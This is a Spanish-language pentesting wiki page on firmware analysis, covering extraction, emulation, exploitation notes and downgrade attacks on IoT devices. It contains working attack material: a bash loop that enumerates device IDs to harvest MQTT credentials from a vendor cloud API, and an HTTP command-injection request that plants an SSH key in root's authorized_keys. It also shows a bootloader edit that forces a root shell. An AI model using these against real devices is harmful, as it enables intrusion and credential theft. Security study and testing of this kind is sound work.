# Análisis de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es el software esencial que permite que los dispositivos funcionen correctamente gestionando y facilitando la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, garantizando que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que conduce al arranque del sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.

## **Recolección de información**

**Recopilación de información** es un paso inicial crítico para entender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Especificaciones del bootloader
- Disposición del hardware y hojas de datos
- Métricas del codebase y ubicaciones de origen
- Bibliotecas externas y tipos de licencia
- Historiales de actualizaciones y certificaciones regulatorias
- Diagramas arquitectónicos y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para ello, las herramientas de inteligencia de fuentes abiertas (OSINT) son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que se puede aprovechar para encontrar posibles problemas.

## **Obtención del firmware**

Obtener el firmware se puede abordar mediante varios medios, cada uno con su propio nivel de complejidad:

- **Directamente** desde la fuente (desarrolladores, fabricantes)
- **Construyéndolo** a partir de instrucciones proporcionadas
- **Descargando** desde sitios de soporte oficiales
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente a **cloud storage**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** mediante técnicas man-in-the-middle
- **Extrayendo** del dispositivo a través de conexiones como **UART**, **JTAG**, o **PICit**
- **Olfateando** solicitudes de actualización dentro de la comunicación del dispositivo
- Identificando y usando endpoints de actualización hardcoded
- **Volcado** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, usando herramientas hardware adecuadas

### UART-only logs: force a root shell via U-Boot env in flash

Si el RX de UART se ignora (solo logs), aún puedes forzar un init shell editando **el blob del entorno de U-Boot** fuera de línea:

1. Volcar la SPI flash con un clip SOIC-8 + programador (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localiza la partición U-Boot env, edita `bootargs` para incluir `init=/bin/sh`, y **recalcula el CRC32 del env de U-Boot** para el blob.
3. Regraba solo la partición env y reinicia; debería aparecer un shell en UART.

Esto es útil en dispositivos embebidos donde el shell del bootloader está deshabilitado pero la partición env es escribible mediante acceso a la flash externa.

## Analizando el firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Diferentes herramientas que puedes usar para eso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si la entropía es baja, no es probable que esté cifrada. Si es alta, es probable que esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos embebidos dentro del firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obteniendo el sistema de archivos

Con las herramientas comentadas anteriormente como `binwalk -ev <bin>` deberías haber podido **extraer el filesystem**.\
Binwalk normalmente lo extrae dentro de una **carpeta nombrada según el tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces binwalk **no detectará el byte mágico del sistema de archivos en sus firmas**. En esos casos, usa binwalk para **encontrar el offset del sistema de archivos y recuperar (carving) el sistema de archivos comprimido** desde el binario y **extraer manualmente** el sistema de archivos según su tipo usando los pasos siguientes.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecute el siguiente **dd command** para realizar carving del Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán en "`squashfs-root`" directory después.

- Para archivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizando el firmware

Una vez obtenido el firmware, es esencial diseccionarlo para entender su estructura y posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (referido como `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer strings, analizar datos binarios y entender los detalles de particiones y sistemas de archivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se verifica la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere ausencia de cifrado, mientras que una entropía alta indica posible cifrado o compresión.

Para extraer **archivos embebidos**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para la inspección de archivos.

### Extracción del sistema de archivos

Usando `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio nombrado según el tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos debido a la ausencia de magic bytes, es necesaria la extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos, seguido del comando `dd` para extraer el sistema de archivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Con el sistema de archivos extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a daemons de red inseguros, credenciales hardcoded, endpoints de API, funcionalidades del servidor de actualizaciones, código sin compilar, scripts de inicio y binarios compilados para análisis offline.

**Ubicaciones clave** y **elementos** a inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para credenciales de usuario
- Certificados SSL y claves en **etc/ssl**
- Archivos de configuración y scripts en busca de vulnerabilidades potenciales
- Binarios embebidos para análisis adicional
- Servidores web y binarios comunes en dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Verificaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben ser examinados en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían ser explotados.

## Extracción de cloud config y credenciales MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen la configuración por dispositivo desde un endpoint cloud con el siguiente formato:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware puede encontrarse que `<token>` se deriva localmente del deviceId usando un secreto hardcoded, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y representado como hex en mayúsculas

Este diseño permite a cualquiera que conozca un deviceId y el STATIC_KEY reconstruir la URL y extraer la cloud config, a menudo revelando credenciales MQTT en texto plano y prefijos de topic.

Flujo de trabajo práctico:

1) Extraer deviceId de los logs de arranque UART

- Conectar un adaptador UART de 3.3V (TX/RX/GND) y capturar los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de URL de configuración en la nube y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recopilar la configuración en la nube y credenciales MQTT

- Construye la URL y descarga el JSON con curl; analiza con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT en texto plano y de ACLs de topics débiles (si están presentes)

- Utiliza credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos previsibles (a escala, con autorización)

- Muchos ecosistemas incrustan bytes OUI del fabricante/producto/tipo seguidos por un sufijo secuencial.
- Puedes iterar IDs candidatos, derivar tokens y obtener configuraciones programáticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Siempre obtenga autorización explícita antes de intentar una enumeración masiva.
- Prefiera emulation o static analysis para recuperar secrets sin modificar el hardware objetivo cuando sea posible.

El proceso de emulating firmware permite el **dynamic analysis** tanto del funcionamiento de un dispositivo como de un programa individual. Este enfoque puede encontrarse con desafíos por dependencias de hardware o architecture, pero transferir el root filesystem o binaries específicos a un dispositivo con architecture y endianness coincidentes, como una Raspberry Pi, o a una pre-built virtual machine, puede facilitar pruebas adicionales.

### Emulating Individual Binaries

Para examinar programas individuales, es crucial identificar el endianness y la CPU architecture del programa.

#### Example with MIPS Architecture

Para emular un MIPS architecture binary, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

Para binarios ARM, el proceso es similar, utilizándose el emulador `qemu-arm` para la emulación.

### Full System Emulation

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa de firmware, automatizan el proceso y ayudan en el análisis dinámico.

## Dynamic Analysis in Practice

En esta etapa se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener acceso a shell al OS y al filesystem. La emulación puede no reproducir perfectamente las interacciones con el hardware, lo que puede requerir reinicios ocasionales de la emulación. El análisis debe revisar nuevamente el filesystem, explotar páginas web expuestas y servicios de red, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles backdoor vulnerabilities.

## Runtime Analysis Techniques

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un depurador completo, **copia un `gdbserver` estáticamente enlazado** al dispositivo y conéctalo de forma remota:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere una comprensión profunda de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de tiempo de ejecución binario en sistemas embebidos son raras, pero cuando están presentes, técnicas como Return Oriented Programming (ROP) pueden ser necesarias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins similares a glibc. Una asignación grande posterior puede disparar `__malloc_consolidate()`, por lo que cualquier fake chunk debe sobrevivir a las comprobaciones (tamaño razonable, `fd = 0`, y los chunks circundantes vistos como "in use").
- **Non-PIE binaries under ASLR:** si ASLR está habilitado pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se asemeje a un encabezado de chunk de heap válido para que una asignación fastbin caiga sobre una **function pointer table**.
- **Parser-stopping NUL:** cuando se parsea JSON, un `\x00` en la carga útil puede detener el parseo mientras mantiene bytes controlados por el atacante al final para un stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** un ROP chain que llama a `open("/proc/self/mem")`, `lseek()`, y `write()` puede plantar shellcode ejecutable en un mapeo conocido y saltar a él.

## Prepared Operating Systems for Firmware Analysis

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar security assessment y penetration testing de dispositivos Internet of Things (IoT). Te ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo para security testing embebido basado en Ubuntu 18.04, preinstalado con herramientas para pruebas de seguridad de firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Incluso cuando un proveedor implementa comprobaciones de firma criptográfica para imágenes de firmware, **la protección contra version rollback (downgrade) se omite con frecuencia**. Cuando el boot- o recovery-loader solo verifica la firma con una clave pública embebida pero no compara la *versión* (o un contador monotónico) de la imagen que se está flasheando, un atacante puede instalar legítimamente un **firmware más antiguo y vulnerable que todavía lleva una firma válida** y así reintroducir vulnerabilidades parcheadas.

Flujo de ataque típico:

1. **Obtain an older signed image**
* Obtenla del portal de descargas público del proveedor, CDN o sitio de soporte.
* Extráela de aplicaciones complementarias móviles/escritorio (p. ej. dentro de un APK de Android en `assets/firmware/`).
* Recupérala de repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *unauthenticated* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y disparan la recuperación/actualización.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Ejemplo: Command Injection después del downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin saneamiento, permitiendo la inyección de comandos arbitrarios (aquí — habilitando el acceso root basado en claves SSH). Las versiones posteriores del firmware introdujeron un filtro de caracteres básico, pero la ausencia de protección contra downgrades invalida la corrección.

### Extracción de firmware desde aplicaciones móviles

Muchos fabricantes incluyen imágenes completas de firmware dentro de sus aplicaciones móviles complementarias para que la app pueda actualizar el dispositivo por Bluetooth/Wi‑Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificación para evaluar la lógica de actualizaciones

* ¿Está el transporte/autenticación del *update endpoint* adecuadamente protegido (TLS + autenticación)?
* ¿Compara el dispositivo **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (p.ej. firmas comprobadas por código ROM)?
* ¿Realiza el código userland comprobaciones adicionales de coherencia (p.ej. mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *partial* o *backup* reutilizan la misma lógica de validación?

> 💡  Si falta cualquiera de lo anterior, la plataforma probablemente sea vulnerable a rollback attacks.

## Firmwares vulnerables para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerables como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Formación y Certificación

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referencias

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
